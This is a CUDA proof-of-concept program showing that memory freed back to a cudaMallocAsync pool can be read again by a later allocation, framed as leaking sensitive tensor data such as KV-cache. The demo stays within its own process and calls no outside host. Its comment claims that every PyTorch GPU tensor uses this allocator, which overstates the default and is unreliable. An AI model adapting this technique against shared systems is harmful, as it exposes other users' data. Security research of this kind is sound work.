#include <cuda_runtime.h>
#include <stdio.h>
#include <stdint.h>

/*
 * CUDA Memory Pool (cudaMallocAsync) Uninitialized Read PoC
 *
 * cudaMallocAsync uses a stream-ordered memory pool that explicitly
 * skips zero-initialization for performance. This is the allocator
 * used by PyTorch's CUDACachingAllocator — meaning every torch.Tensor
 * on GPU is subject to this behavior.
 *
 * Attack scenario:
 *   Tensor A holds sensitive data (user input tokens, KV-cache).
 *   Tensor A is freed back to pool (del tensor_a).
 *   Tensor B is allocated from the same pool.
 *   Tensor B contains Tensor A's data without any copy.
 */

#define CHECK(call)                                                      \
    do {                                                                 \
        cudaError_t err = (call);                                        \
        if (err != cudaSuccess) {                                        \
            fprintf(stderr, "CUDA error %s:%d: %s\n",                   \
                    __FILE__, __LINE__, cudaGetErrorString(err));        \
            exit(1);                                                     \
        }                                                                \
    } while (0)

__global__ void write_secret(float *buf, int n) {
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    if (i < n)
        buf[i] = 3.14159f * (i + 1);  /* recognizable float pattern */
}

__global__ void read_buf(float *buf, float *out, int n) {
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    if (i < n)
        out[i] = buf[i];
}

int main() {
    const int N = 4096;
    cudaStream_t stream;
    CHECK(cudaStreamCreate(&stream));

    float *d_secret = NULL;
    float *d_new    = NULL;
    float *d_out    = NULL;
    float  h_result[N];

    printf("=== CUDA Memory Pool (cudaMallocAsync) Leak PoC ===\n");
    printf("    Simulates PyTorch CUDACachingAllocator behavior\n\n");

    /* Step 1: Allocate via pool, write secret, free back to pool */
    printf("[1] Pool-allocating %zu bytes, writing float pattern...\n",
           N * sizeof(float));
    CHECK(cudaMallocAsync(&d_secret, N * sizeof(float), stream));
    write_secret<<<(N+255)/256, 256, 0, stream>>>(d_secret, N);
    CHECK(cudaFreeAsync(d_secret, stream));

    /* Step 2: Allocate again from same pool — no zeroing */
    CHECK(cudaMallocAsync(&d_new, N * sizeof(float), stream));
    CHECK(cudaMallocAsync(&d_out, N * sizeof(float), stream));
    printf("[2] New pool allocation:\n");
    printf("    Old ptr: %p\n", (void*)d_secret);
    printf("    New ptr: %p\n\n", (void*)d_new);

    /* Step 3: Read new buffer without initializing */
    read_buf<<<(N+255)/256, 256, 0, stream>>>(d_new, d_out, N);
    CHECK(cudaMemcpyAsync(h_result, d_out, N * sizeof(float),
                          cudaMemcpyDeviceToHost, stream));
    CHECK(cudaStreamSynchronize(stream));

    /* Step 4: Verify leak */
    int matches = 0;
    float max_err = 0.0f;
    for (int i = 0; i < N; i++) {
        float expected = 3.14159f * (i + 1);
        float err = h_result[i] - expected;
        if (err < 0) err = -err;
        if (err < 1e-3f) matches++;
        if (err > max_err) max_err = err;
    }

    printf("[3] Results:\n");
    printf("    Floats read:             %d\n", N);
    printf("    Matching secret pattern: %d / %d (%.1f%%)\n",
           matches, N, 100.0f * matches / N);
    printf("    Max error vs expected:   %.6f\n", max_err);

    if (matches == N) {
        printf("\n[!] FULL LEAK confirmed via memory pool.\n");
        printf("    First 8 values: ");
        for (int i = 0; i < 8; i++) printf("%.4f ", h_result[i]);
        printf("\n");
        printf("    Expected first 8: ");
        for (int i = 0; i < 8; i++) printf("%.4f ", 3.14159f*(i+1));
        printf("\n");
    } else if (matches > N / 2) {
        printf("\n[~] SIGNIFICANT LEAK: >50%% of previous data readable.\n");
    } else {
        printf("\n[=] Minimal leak via pool (%.1f%% match).\n",
               100.0f * matches / N);
    }

    CHECK(cudaFreeAsync(d_new, stream));
    CHECK(cudaFreeAsync(d_out, stream));
    CHECK(cudaStreamDestroy(stream));
    return 0;
}
